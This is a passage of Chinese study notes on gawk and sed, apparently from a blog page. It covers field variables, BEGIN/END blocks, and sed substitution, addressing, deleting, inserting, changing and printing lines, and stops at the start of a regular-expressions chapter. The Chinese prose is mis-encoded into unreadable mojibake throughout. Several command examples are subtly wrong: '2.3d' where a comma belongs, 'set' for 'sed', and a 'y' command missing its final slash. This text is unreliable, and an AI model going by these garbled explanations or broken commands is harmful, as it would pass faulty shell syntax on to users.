href="#ä½¿ç”¨æ•°æ®å­—æ®µå˜é‡" class="headerlink" title="ä½¿ç”¨æ•°æ®å­—æ®µå˜é‡"></a>ä½¿ç”¨æ•°æ®å­—æ®µå˜é‡</h4><p>gawk ä¼šç»™ä¸€è¡Œä¸­çš„æ¯ä¸ªæ•°æ®å…ƒç´ åˆ†é…ä¸€ä¸ªå˜é‡, é»˜è®¤ä¸º:</p><ul><li><code>$0</code>, ä»£è¡¨æ•´ä¸ªæ–‡æœ¬è¡Œ</li><li><code>$1</code>, ä»£è¡¨æ–‡æœ¬è¡Œä¸­çš„ç¬¬1ä¸ªæ•°æ®å­—æ®µ</li><li><code>$2</code>, ä»£è¡¨æ–‡æœ¬è¡Œä¸­çš„ç¬¬2ä¸ªæ•°æ®å­—æ®µ</li><li><code>$n</code>, ä»£è¡¨æ–‡æœ¬è¡Œä¸­çš„ç¬¬nä¸ªæ•°æ®å­—æ®µ<br>åœ¨æ–‡æœ¬è¡Œä¸­ï¼Œæ¯ä¸ªæ•°æ®å­—æ®µéƒ½æ˜¯é€šè¿‡<mark>å­—æ®µåˆ†éš”ç¬¦</mark>åˆ’åˆ†çš„ã€‚é»˜è®¤ä¸ºä»»æ„çš„ç©ºç™½å­—ç¬¦.</li></ul><h4 id="åœ¨ç¨‹åºè„šæœ¬ä¸­ä½¿ç”¨å¤šä¸ªå‘½ä»¤"><a href="#åœ¨ç¨‹åºè„šæœ¬ä¸­ä½¿ç”¨å¤šä¸ªå‘½ä»¤" class="headerlink" title="åœ¨ç¨‹åºè„šæœ¬ä¸­ä½¿ç”¨å¤šä¸ªå‘½ä»¤"></a>åœ¨ç¨‹åºè„šæœ¬ä¸­ä½¿ç”¨å¤šä¸ªå‘½ä»¤</h4><p>ä½¿ç”¨åˆ†å· <code>;</code> åˆ†éš”.</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">$ gawk <span class="hljs-string">&#x27;&#123;<span class="hljs-subst">$4</span>=&quot;Christine&quot;; print <span class="hljs-subst">$0</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ä¸€æ¬¡ä¸€è¡Œ:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ gawk &#x27;&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">$<span class="hljs-number">4</span>=<span class="hljs-string">&quot;Christine</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">print $0&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><h4 id="ä»æ–‡ä»¶ä¸­è¯»å–ç¨‹åº"><a href="#ä»æ–‡ä»¶ä¸­è¯»å–ç¨‹åº" class="headerlink" title="ä»æ–‡ä»¶ä¸­è¯»å–ç¨‹åº"></a>ä»æ–‡ä»¶ä¸­è¯»å–ç¨‹åº</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> gawk <span class="hljs-operator">-F</span>: <span class="hljs-operator">-f</span> script2.gawk /etc/passwd<br></code></pre></td></tr></table></figure><p>è„šæœ¬æ–‡ä»¶ä¸­ä¸€æ¡å‘½ä»¤ä¸€è¡Œï¼Œä¸éœ€è¦åˆ†å·ï¼Œä½†éœ€è¦ä¸€å¯¹èŠ±æ‹¬å·.</p><h4 id="åœ¨è¯»å–æ•°æ®å‰è¿è¡Œè„šæœ¬"><a href="#åœ¨è¯»å–æ•°æ®å‰è¿è¡Œè„šæœ¬" class="headerlink" title="åœ¨è¯»å–æ•°æ®å‰è¿è¡Œè„šæœ¬"></a>åœ¨è¯»å–æ•°æ®å‰è¿è¡Œè„šæœ¬</h4><p>gawk å…è®¸æŒ‡å®šç¨‹åºè„šæœ¬ä½•æ—¶è¿è¡Œã€‚</p><p><code>BEGIN</code> å…³é”®è¯ï¼Œè®©ç¨‹åºåœ¨è¯»å–æ•°æ®å‰è¿è¡Œè„šæœ¬ </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ gawk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;print <span class="hljs-string">&quot;Hello World&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><h4 id="åœ¨å¤„ç†æ•°æ®åè¿è¡Œè„šæœ¬"><a href="#åœ¨å¤„ç†æ•°æ®åè¿è¡Œè„šæœ¬" class="headerlink" title="åœ¨å¤„ç†æ•°æ®åè¿è¡Œè„šæœ¬"></a>åœ¨å¤„ç†æ•°æ®åè¿è¡Œè„šæœ¬</h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">$ gawk &#x27;<span class="hljs-type">END</span> &#123;print <span class="hljs-string">&quot;End of File&quot;</span>&#125;&#x27; <span class="hljs-class"><span class="hljs-keyword">data</span>.txt</span><br></code></pre></td></tr></table></figure><h2 id="19-2-sed-ç¼–è¾‘å™¨åŸºç¡€"><a href="#19-2-sed-ç¼–è¾‘å™¨åŸºç¡€" class="headerlink" title="19.2 sed ç¼–è¾‘å™¨åŸºç¡€"></a>19.2 sed ç¼–è¾‘å™¨åŸºç¡€</h2><h3 id="19-2-1-æ›´å¤šçš„æ›¿æ¢é€‰é¡¹"><a href="#19-2-1-æ›´å¤šçš„æ›¿æ¢é€‰é¡¹" class="headerlink" title="19.2.1 æ›´å¤šçš„æ›¿æ¢é€‰é¡¹"></a>19.2.1 æ›´å¤šçš„æ›¿æ¢é€‰é¡¹</h3><h4 id="æ›¿æ¢æ ‡è®°"><a href="#æ›¿æ¢æ ‡è®°" class="headerlink" title="æ›¿æ¢æ ‡è®°"></a>æ›¿æ¢æ ‡è®°</h4><p>æ›¿æ¢å‘½ä»¤åœ¨æ›¿æ¢å¤šè¡Œæ–‡æœ¬æ—¶èƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œä½†é»˜è®¤æƒ…å†µä¸‹å®ƒåªæ›¿æ¢æ¯è¡Œä¸­å‡ºç°çš„ç¬¬ä¸€å¤„.</p><p>å››ç§æ›¿æ¢æ ‡ç­¾ (substitution flag):</p><ul><li>æ•°å­—ï¼Œè¡¨æ˜æ–°æ–‡æœ¬å°†æ›¿æ¢åœ°æŒ¤å‡ºæ¨¡å¼åŒ¹é…çš„åœ°æ–¹</li><li>g, è¡¨æ˜æ–°æ–‡æœ¬å°†ä¼šæ›¿æ¢æ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬</li><li>p, è¡¨æ˜è¾“å‡ºä¿®æ”¹è¿‡çš„è¡Œ, é€šå¸¸å’Œ <code>-n</code> é€‰é¡¹ä¸€èµ·ç”¨</li><li>w file, å°†æ›¿æ¢ç»“æœå†™åˆ°æ–‡ä»¶ä¸­<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sed &#x27;s/<span class="hljs-keyword">test</span>/trial/w <span class="hljs-keyword">test</span>.txt&#x27; data.txt<br></code></pre></td></tr></table></figure>è¿™é‡Œçš„ <code>test.txt</code> æ˜¯æŒ‡å®šçš„ç”¨æ¥ä¿å­˜çš„æ–‡ä»¶.</li></ul><h4 id="æ›¿æ¢å­—ç¬¦"><a href="#æ›¿æ¢å­—ç¬¦" class="headerlink" title="æ›¿æ¢å­—ç¬¦"></a>æ›¿æ¢å­—ç¬¦</h4><p>sed å…è®¸é€‰æ‹©å…¶ä»–å­—ç¬¦ä½œä¸ºæ›¿æ¢å‘½ä»¤ä¸­çš„åˆ†éš”ç¬¦:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sed <span class="hljs-string">&#x27;s!/bin/bash!/bin/csh!&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>!</code> ä½œä¸ºåˆ†éš”ç¬¦.</p><h3 id="19-2-2-ä½¿ç”¨åœ°å€"><a href="#19-2-2-ä½¿ç”¨åœ°å€" class="headerlink" title="19.2.2 ä½¿ç”¨åœ°å€"></a>19.2.2 ä½¿ç”¨åœ°å€</h3><p>ä½¿ç”¨è¡Œå¯»å€ (line addressing), å°†å‘½ä»¤ä½œç”¨äºç‰¹å®šè¡Œæˆ–æŸäº›è¡Œ.</p><p>ä¸¤ç§å½¢å¼:</p><ul><li>ä»¥æ•°å­—å½¢å¼è¡¨ç¤ºè¡ŒåŒºé—´</li><li>ç”¨æ–‡æœ¬æ¨¡å¼æ¥è¿‡æ»¤å‡ºè¡Œ</li></ul><p>æ ¼å¼å‡ä¸º:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[address]</span>command<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">address &#123;<br>  comma<span class="hljs-symbol">nd1</span><br>  comma<span class="hljs-symbol">nd2</span><br>  comma<span class="hljs-symbol">nd3</span><br>&#125;<br></code></pre></td></tr></table></figure><p>sed ç¼–è¾‘å™¨ä¼šå°†æŒ‡å®šçš„æ¯æ¡å‘½ä»¤ä½œç”¨åˆ°åŒ¹é…æŒ‡å®šåœ°å€çš„è¡Œä¸Š.</p><h4 id="æ•°å­—å½¢å¼çš„è¡Œå¯»å€"><a href="#æ•°å­—å½¢å¼çš„è¡Œå¯»å€" class="headerlink" title="æ•°å­—å½¢å¼çš„è¡Œå¯»å€"></a>æ•°å­—å½¢å¼çš„è¡Œå¯»å€</h4><p>å¯ä»¥æ˜¯è¡Œå·ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒºé—´:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2s/dog/cat/&#x27;</span> data.txt<br><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2,3s/dog/cat/&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>ç¾å…ƒç¬¦ <code>$</code> æ˜¯ç‰¹æ®Šåœ°å€ï¼Œè¡¨ç¤ºæœ€åä¸€è¡Œ.</p><h4 id="ä½¿ç”¨æ–‡æœ¬æ¨¡å¼è¿‡æ»¤å™¨"><a href="#ä½¿ç”¨æ–‡æœ¬æ¨¡å¼è¿‡æ»¤å™¨" class="headerlink" title="ä½¿ç”¨æ–‡æœ¬æ¨¡å¼è¿‡æ»¤å™¨"></a>ä½¿ç”¨æ–‡æœ¬æ¨¡å¼è¿‡æ»¤å™¨</h4><p>æ ¼å¼ä¸º:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/pattern/</span>command<br></code></pre></td></tr></table></figure><p>å¿…é¡»ç”¨æ­£æ–œçº¿ <code>/</code> å°†æŒ‡å®šçš„ <code>pattern</code> å°èµ·æ¥ï¼Œsed ç¼–è¾‘å™¨ä¼šå°†å‘½ä»¤ä½œç”¨åˆ°åŒ…å«æŒ‡å®šæ–‡æœ¬æ¨¡å¼çš„è¡Œä¸Š.</p><p>å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sed <span class="hljs-string">&#x27;/Samantha/s/bash/csh/&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„æ–‡æœ¬æ¨¡å¼ä¸­å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼.</p><h4 id="å‘½ä»¤ç»„åˆ"><a href="#å‘½ä»¤ç»„åˆ" class="headerlink" title="å‘½ä»¤ç»„åˆ"></a>å‘½ä»¤ç»„åˆ</h4><p>åœ¨å•è¡Œæ‰§è¡Œå¤šæ¡å‘½ä»¤:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed &#x27;2&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/fox/elephant/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/dog/cat/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h3 id="19-2-3-åˆ é™¤è¡Œ"><a href="#19-2-3-åˆ é™¤è¡Œ" class="headerlink" title="19.2.3 åˆ é™¤è¡Œ"></a>19.2.3 åˆ é™¤è¡Œ</h3><p>åˆ é™¤å‘½ä»¤ <code>d</code>, å®ƒä¼šåˆ é™¤åŒ¹é…æŒ‡å®šå¯»å€æ¨¡å¼çš„æ‰€æœ‰è¡Œã€‚</p><p>åˆ é™¤æ‰€æœ‰è¡Œ:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>æŒ‡å®šè¡Œå·:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>æŒ‡å®šåŒºé—´:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2.3d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–‡æœ¬æ¨¡å¼:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;/pattern/d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸¤ä¸ªæ–‡æœ¬æ¨¡å¼åˆ é™¤æŸä¸ªåŒºé—´ï¼Œç¬¬ä¸€ä¸ªæ–‡æœ¬æ¨¡å¼ä¼šæ‰“å¼€â€åˆ é™¤â€åŠŸèƒ½ï¼Œç¬¬äºŒä¸ªæ–‡æœ¬æ¨¡å¼åŒ¹é…ç»“æŸåä¼šå…³é—­â€åˆ é™¤â€åŠŸèƒ½:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;/1/,/3/d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h3 id="19-2-4-æ’å…¥å’Œé™„åŠ æ–‡æœ¬"><a href="#19-2-4-æ’å…¥å’Œé™„åŠ æ–‡æœ¬" class="headerlink" title="19.2.4 æ’å…¥å’Œé™„åŠ æ–‡æœ¬"></a>19.2.4 æ’å…¥å’Œé™„åŠ æ–‡æœ¬</h3><ul><li>æ’å…¥ (insert) å‘½ä»¤ (i) ä¼šåœ¨æŒ‡å®šè¡Œå‰å¢åŠ ä¸€ä¸ªæ–°è¡Œ</li><li>é™„åŠ  (append) å‘½ä»¤ (a) ä¼šåœ¨æŒ‡å®šè¡Œåå¢åŠ ä¸€ä¸ªæ–°è¡Œ<br>æ ¼å¼:<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;[address]command\ new_line_contents&#x27;</span><br></code></pre></td></tr></table></figure>æ³¨æ„è¿™é‡Œæ˜¯åæ–œçº¿.</li></ul><p>å¦‚:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3i\ This is an insert line&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™æ›´æ¸…æ™°:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3i\</span><br><span class="hljs-string">&gt; This is an insert line&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h3 id="19-2-5-ä¿®æ”¹è¡Œ"><a href="#19-2-5-ä¿®æ”¹è¡Œ" class="headerlink" title="19.2.5 ä¿®æ”¹è¡Œ"></a>19.2.5 ä¿®æ”¹è¡Œ</h3><p>ä¿®æ”¹ (change) å‘½ä»¤å…è®¸ä¿®æ”¹æ•°æ®æµä¸­æ•´è¡Œæ–‡æœ¬çš„å†…å®¹ï¼Œå…¶è·Ÿæ’å…¥å’Œé™„åŠ å‘½ä»¤çš„å·¥ä½œæœºåˆ¶ä¸€æ ·.</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;<span class="hljs-number">3</span>c\<br>&gt; This <span class="hljs-keyword">is</span> a changed <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨æ–‡æœ¬æ¨¡å¼å¯»å€:</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;/pattern/c\<br>&gt; This <span class="hljs-keyword">is</span> a changed <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>è‹¥ç”¨åŒºé—´ä¼šå‡ºé—®é¢˜:</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>\c<br>&gt; This <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>å…¶ä¼šæŠŠ <code>2,3</code> åŒºé—´çš„è¡Œæ”¹ä¸ºä¸€è¡Œ.</p><h3 id="19-2-6-è½¬æ¢å‘½ä»¤"><a href="#19-2-6-è½¬æ¢å‘½ä»¤" class="headerlink" title="19.2.6 è½¬æ¢å‘½ä»¤"></a>19.2.6 è½¬æ¢å‘½ä»¤</h3><p>è½¬æ¢ (transform) å‘½ä»¤ (y) æ˜¯å”¯ä¸€å¯ä»¥å¤„ç†å•ä¸ªå­—ç¬¦çš„ sed ç¼–è¾‘å™¨å‘½ä»¤ã€‚</p><p>æ ¼å¼:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">[address]y<span class="hljs-regexp">/inchars/</span>outchars/<br></code></pre></td></tr></table></figure><p>ä¸è¦æŠŠ <code>inchars</code> å’Œ <code>outchars</code> çœ‹åšä¸€ä¸ªå•è¯ï¼Œåº”ä¸ºä¸€ä¸ªä¸ªå­—ç¬¦ï¼Œå…¶æ˜ å°„ä¸ºä¸€ä¸€å¯¹åº”ï¼Œä¸ªæ•°ä¸ä¸€è‡´ä¼šæŠ¥é”™:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;y/123/456&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶é‡Œé¢æ‰€æœ‰çš„ <code>1</code> ä¼šè¢«æ›¿æ¢ä¸º <code>4</code>.</p><h3 id="19-2-7-å›é¡¾æ‰“å°"><a href="#19-2-7-å›é¡¾æ‰“å°" class="headerlink" title="19.2.7 å›é¡¾æ‰“å°"></a>19.2.7 å›é¡¾æ‰“å°</h3><p>ç”¨äºæ‰“å°æ•°æ®æµä¸­çš„ä¿¡æ¯:</p><ul><li>på‘½ä»¤ç”¨æ¥æ‰“å°æ–‡æœ¬è¡Œ</li><li>ç­‰å· (&#x3D;) ç”¨æ¥æ‰“å°è¡Œå·</li><li>1 (å°å†™çš„L) ç”¨æ¥åˆ—å‡ºè¡Œ</li></ul><h4 id="æ‰“å°è¡Œ"><a href="#æ‰“å°è¡Œ" class="headerlink" title="æ‰“å°è¡Œ"></a>æ‰“å°è¡Œ</h4><p>æ‰“å°æŒ‡å®šè¡Œåœ°å€çš„è¡Œ:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed -n <span class="hljs-string">&#x27;2,3p&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>æ‰“å°åŒ…å«æ–‡æœ¬æ¨¡å¼åŒ¹é…ä¸Šçš„è¡Œ:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed -n &#x27;/pattern/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/line/test/p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="æ‰“å°è¡Œå·"><a href="#æ‰“å°è¡Œå·" class="headerlink" title="æ‰“å°è¡Œå·"></a>æ‰“å°è¡Œå·</h4><p>ä½¿ç”¨ <code>=</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> <span class="hljs-keyword">set</span> <span class="hljs-string">&#x27;=&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>sed åœ¨å®é™…æ–‡æœ¬å‡ºç°ä¹‹å‰æ‰“å°å‡ºè¡Œå·ã€‚</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ set -n &#x27;/number 4/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">=</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="åˆ—å‡ºè¡Œ"><a href="#åˆ—å‡ºè¡Œ" class="headerlink" title="åˆ—å‡ºè¡Œ"></a>åˆ—å‡ºè¡Œ</h4><p>åˆ—å‡º (list) å‘½ä»¤ (l) å¯ä»¥æ‰“å°æ•°æ®æµä¸­çš„æ–‡æœ¬å’Œä¸å¯æ‰“å°çš„ ASCII å­—ç¬¦ã€‚</p><p>ä»»ä½•ä¸å¯æ‰“å°å­—ç¬¦è¦ä¹ˆåœ¨å…¶å…«è¿›åˆ¶å€¼å‰åŠ ä¸€ä¸ªåæ–œçº¿ï¼Œè¦ä¹ˆä½¿ç”¨ C è¯­è¨€é£æ ¼çš„å‘½åæ³•, å¦‚ <code>\t</code>.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> data.txt<br>This  line  contains  tabs<br><span class="hljs-variable">$</span><br><span class="hljs-variable">$</span> sed <span class="hljs-literal">-n</span> <span class="hljs-string">&#x27;l&#x27;</span> data.txt<br>This\tline\tcontains\ttabs<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><h3 id="19-2-8-ä½¿ç”¨-sed-å¤„ç†æ–‡ä»¶"><a href="#19-2-8-ä½¿ç”¨-sed-å¤„ç†æ–‡ä»¶" class="headerlink" title="19.2.8 ä½¿ç”¨ sed å¤„ç†æ–‡ä»¶"></a>19.2.8 ä½¿ç”¨ sed å¤„ç†æ–‡ä»¶</h3><h4 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2.3w test.txt&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h4 id="ä»æ–‡ä»¶è¯»å–æ•°æ®"><a href="#ä»æ–‡ä»¶è¯»å–æ•°æ®" class="headerlink" title="ä»æ–‡ä»¶è¯»å–æ•°æ®"></a>ä»æ–‡ä»¶è¯»å–æ•°æ®</h4><p>è¯»å– (read) å‘½ä»¤ (r) å…è®¸å°†ä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶ä¸­çš„æ•°æ®æ’å…¥åˆ°æ•°æ®æµä¸­ã€‚</p><p>æ ¼å¼:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[address]</span>r filename<br></code></pre></td></tr></table></figure><p>sed ç¼–è¾‘å™¨ä¼šå°†æ–‡ä»¶ä¸­çš„æ–‡æœ¬æ’å…¥åˆ°æŒ‡å®šåœ°å€ä¹‹å.</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed &#x27;/LIST/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r detail.<span class="hljs-property">txt</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">d</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; notice.std</span></span><br></code></pre></td></tr></table></figure><p>å‰é¢çš„æ–‡æœ¬æ¨¡å¼å¯¹åé¢çš„å‘½ä»¤éƒ½èµ·æ•ˆæœ.</p><h1 id="ç¬¬20ç« -æ­£åˆ™è¡¨è¾¾å¼"><a href="#ç¬¬20ç« -æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ç¬¬20ç«  æ­£åˆ™è¡¨è¾¾å¼"></a>ç¬¬20ç«  æ­£åˆ™è¡¨è¾¾å¼</h1><h2 id="20-1-ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"><a href="#20-1-ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="20.1 ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"></a>20.1 ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼</h2><h3 id="20-1-1-å®šä¹‰"><a href="#20-1-1-å®šä¹‰" class="headerlink" title="20.1.1 å®šä¹‰"></a>20.1.1 å®šä¹‰</h3><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä½ æ‰€å®šä¹‰çš„æ¨¡å¼æ¨¡æ¿ (pattern template), Linux å·¥å…·å¯ä»¥ç”¨å®ƒæ¥è¿‡æ»¤æ–‡æœ¬.</p><h3 id="20-1-2-æ­£åˆ™è¡¨è¾¾å¼çš„ç±»å‹"><a href="#20-1-2-æ­£åˆ™è¡¨è¾¾å¼çš„ç±»å‹" class="headerlink" title="20.1.2 æ­£åˆ™è¡¨è¾¾å¼çš„ç±»å‹"></a>20.1.2 æ­£åˆ™è¡¨è¾¾å¼çš„ç±»å‹</h3><p>æ­£åˆ™è¡¨è¾¾å¼å¼•æ“æ˜¯ä¸€å¥—åº•å±‚è½¯ä»¶, è´Ÿè´£è§£é‡Šæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼å¹¶ä½¿ç”¨è¿™äº›æ¨¡å¼è¿›è¡Œæ–‡æœ¬åŒ¹é….</p><p>sed ç¼–è¾‘å™¨åªç¬¦åˆ BRE (Basic Regular Expression) å¼•æ“è§„èŒƒçš„å­é›†.</p><p>gawk ç¨‹åºç”¨ ERE (Extended Regular Expression) å¼•æ“æ¥å¤„ç†å®ƒçš„æ­£åˆ™è¡¨è¾¾å¼.</p><h2 id="20-2-å®šä¹‰-BRE-æ¨¡å¼"><a href="#20-2-å®šä¹‰-BRE-æ¨¡å¼" class="headerlink" title="20.2 å®šä¹‰ BRE æ¨¡å¼"></a>20.2 å®šä¹‰ BRE 